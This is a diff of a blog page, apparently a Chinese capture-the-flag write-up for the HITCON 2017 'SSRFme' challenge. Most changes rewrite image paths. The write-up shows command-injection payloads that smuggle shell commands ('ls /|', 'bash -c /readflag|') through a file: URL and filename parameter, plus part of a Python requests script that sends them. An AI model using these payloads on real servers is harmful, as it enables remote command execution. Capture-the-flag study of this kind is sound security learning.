@@ -10,9 +10,9 @@
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="H3ng,"> 
-    <meta name="description" content="117.21.200.165 &amp;lt;?php
+    <meta name="description" content="&amp;lt;?php
     if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
-        $http_x_headers ,"> 
+        $http_x_headers = explode(&#39;,&#39;, ,"> 
     <meta name="author" content="H3ng"> 
     <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -56,7 +56,7 @@
 
         </div>
         <div class="content markdown">
-            <pre><code>117.21.200.165 &lt;?php
+            <pre><code>&lt;?php
     if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
         $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];
@@ -107,17 +107,17 @@ print_r (explode(".",$str));
 <pre><code>orange+ip地址</code></pre>
 <p>访问</p>
 <pre><code>/sandbox/fb8ca607c1b8f0bf763cbac72b8b6875</code></pre>
-<p><img src="/HITCON%EF%BC%9A2017-SSRFme.assets/image-20210608212437627.png" alt="image-20210608212437627"></p>
+<p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608212437627.png" alt="image-20210608212437627"></p>
 <p>执行两次</p>
 <pre class=" language-cpp"><code class="language-cpp"><span class="token operator">?</span>url<span class="token operator">=</span>file<span class="token operator">:</span>ls <span class="token operator">/</span><span class="token operator">|</span><span class="token operator">&amp;</span>filename<span class="token operator">=</span>ls <span class="token operator">/</span><span class="token operator">|</span></code></pre>
 <p>访问：</p>
 <pre><code>/sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/ls /|</code></pre>
-<p><img src="/HITCON%EF%BC%9A2017-SSRFme.assets/image-20210608212926383.png" alt="image-20210608212926383"></p>
+<p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608212926383.png" alt="image-20210608212926383"></p>
 <p><code>然后readflag，如果直接/readflag的话，那么会在服务器的根目录创建这个文件，而不是在网站的那个目录，所以是无法命令执行的，所以可以用bash -c 相当于./readflag，而根据php字符解析特性，如果直接将./readflag传入，那么.就会变成下划线,从而不能命令执行。直接bash的话好像是只能bash 有sh后缀的文件，所以不能用</code><br><code>综上所述，bash -c 是最好的选择</code><br>同样运行两遍</p>
 <pre><code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code></pre>
 <p>进到路径即可</p>
 <pre><code>sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/bash%20-c%20/readflag%7C</code></pre>
-<p><img src="/HITCON%EF%BC%9A2017-SSRFme.assets/image-20210608213537379.png" alt="image-20210608213537379"></p>
+<p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608213537379.png" alt="image-20210608213537379"></p>
 <p>脚本：</p>
 <pre><code>#coding:utf-8
 import requests
@@ -130,7 +130,7 @@ see = 'sandbox/fb8ca607c1b8f0bf763cbac72b8b6875/data'
 r = requests.get(url = url+payload.format(exp))
 r = requests.get(url+see)
 print(r.text)</code></pre>
-<p><img src="/HITCON%EF%BC%9A2017-SSRFme.assets/image-20210608214022020.png" alt="image-20210608214022020"></p>
+<p><img src="/2021/06/08/hitcon-2017-ssrfme/image-20210608214022020.png" alt="image-20210608214022020"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
